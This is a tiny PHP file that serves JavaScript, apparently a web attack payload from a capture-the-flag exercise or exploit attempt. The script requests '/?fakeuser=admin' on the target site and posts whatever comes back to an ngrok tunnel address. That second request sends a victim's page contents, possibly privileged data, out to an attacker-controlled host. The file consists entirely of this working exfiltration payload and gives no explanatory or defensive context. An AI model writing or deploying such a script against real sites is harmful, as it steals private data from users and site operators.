<?php
@header('Contet-Type: application/javascript');
?>

fetch('/?fakeuser=admin')
	.then(response => response.text())
  	.then(data =>{
		fetch('http://293fb56704d7.ngrok.io/', {
			method : 'post',
			body: data
	})
});
